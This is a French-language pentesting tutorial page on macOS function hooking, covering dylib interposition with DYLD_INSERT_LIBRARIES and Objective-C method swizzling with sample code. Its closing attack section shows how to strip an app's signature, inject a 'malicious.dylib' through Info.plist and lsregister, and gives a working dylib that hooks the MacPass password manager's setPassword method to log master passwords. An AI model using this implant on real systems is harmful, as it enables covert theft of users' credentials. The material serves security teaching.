# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Interposition de Fonction

Créez un **dylib** avec une section **`__interpose`** (ou une section marquée avec **`S_INTERPOSING`**) contenant des tuples de **pointeurs de fonction** qui se réfèrent aux fonctions **originales** et **de remplacement**.

Ensuite, **injectez** le dylib avec **`DYLD_INSERT_LIBRARIES`** (l'interposition doit se produire avant le chargement de l'application principale). Évidemment, les [**restrictions** appliquées à l'utilisation de **`DYLD_INSERT_LIBRARIES`** s'appliquent également ici](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Interposer printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Méthode Swizzling

En ObjectiveC, voici comment une méthode est appelée : **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Il faut l'**objet**, la **méthode** et les **params**. Et lorsqu'une méthode est appelée, un **msg est envoyé** en utilisant la fonction **`objc_msgSend`** : `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

L'objet est **`someObject`**, la méthode est **`@selector(method1p1:p2:)`** et les arguments sont **value1**, **value2**.

En suivant les structures d'objet, il est possible d'atteindre un **tableau de méthodes** où les **noms** et les **pointeurs** vers le code de la méthode sont **situés**.

> [!CAUTION]
> Notez qu'en raison du fait que les méthodes et les classes sont accessibles en fonction de leurs noms, ces informations sont stockées dans le binaire, il est donc possible de les récupérer avec `otool -ov </path/bin>` ou [`class-dump </path/bin>`](https://github.com/nygard/class-dump)

### Accéder aux méthodes brutes

Il est possible d'accéder aux informations des méthodes telles que le nom, le nombre de params ou l'adresse comme dans l'exemple suivant :
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Échange de méthodes avec method_exchangeImplementations

La fonction **`method_exchangeImplementations`** permet de **changer** l'**adresse** de l'**implémentation** d'**une fonction pour l'autre**.

> [!CAUTION]
> Donc, lorsque une fonction est appelée, ce qui est **exécuté est l'autre**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> Dans ce cas, si le **code d'implémentation de la méthode légitime** **vérifie** le **nom de la méthode**, il pourrait **détecter** ce swizzling et l'empêcher de s'exécuter.
>
> La technique suivante n'a pas cette restriction.

### Swizzling de méthode avec method_setImplementation

Le format précédent est étrange car vous changez l'implémentation de 2 méthodes l'une pour l'autre. En utilisant la fonction **`method_setImplementation`**, vous pouvez **changer** l'**implémentation** d'une **méthode pour l'autre**.

N'oubliez pas de **stocker l'adresse de l'implémentation de l'originale** si vous prévoyez de l'appeler depuis la nouvelle implémentation avant de l'écraser, car il sera beaucoup plus compliqué de localiser cette adresse par la suite.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Méthodologie d'attaque par hooking

Dans cette page, différentes manières de hooker des fonctions ont été discutées. Cependant, elles impliquaient **l'exécution de code à l'intérieur du processus pour attaquer**.

Pour ce faire, la technique la plus simple à utiliser est d'injecter un [Dyld via des variables d'environnement ou un détournement](../macos-dyld-hijacking-and-dyld_insert_libraries.md). Cependant, je suppose que cela pourrait également être fait via [l'injection de processus Dylib](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Cependant, les deux options sont **limitées** aux binaires/processus **non protégés**. Vérifiez chaque technique pour en savoir plus sur les limitations.

Cependant, une attaque par hooking de fonction est très spécifique, un attaquant le fera pour **voler des informations sensibles à l'intérieur d'un processus** (sinon, vous feriez simplement une attaque par injection de processus). Et ces informations sensibles pourraient se trouver dans des applications téléchargées par l'utilisateur telles que MacPass.

Ainsi, le vecteur de l'attaquant serait soit de trouver une vulnérabilité, soit de supprimer la signature de l'application, d'injecter la variable d'environnement **`DYLD_INSERT_LIBRARIES`** à travers le Info.plist de l'application en ajoutant quelque chose comme :
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
et ensuite **réenregistrer** l'application :
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Ajoutez dans cette bibliothèque le code de hooking pour exfiltrer les informations : mots de passe, messages...

> [!CAUTION]
> Notez que dans les versions plus récentes de macOS, si vous **supprimez la signature** du binaire de l'application et qu'il a été exécuté précédemment, macOS **n'exécutera plus l'application**.

#### Exemple de bibliothèque
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Références

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
